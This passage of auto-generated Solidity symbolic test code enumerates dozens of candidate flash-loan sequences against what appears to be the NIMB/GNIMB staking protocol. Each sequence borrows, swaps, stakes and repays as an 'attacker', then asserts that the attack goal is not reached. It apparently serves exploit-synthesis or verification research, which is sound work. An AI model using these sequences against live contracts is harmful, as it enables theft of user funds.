        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4926(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4927(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4928(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4929(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4930(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4931(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4932(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4933(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4934(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4935(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4936(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4937(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4938(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4939(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4940(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4941(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4942(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4943(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4944(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4945(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4946(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4947(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4948(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4949(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4950(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4951(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4952(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4953(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4954(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4955(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4956(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4957(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4958(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4959(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4960(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4961(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4962(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4963(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4964(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4965(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4966(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4967(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4968(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4969(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4970(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4971(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
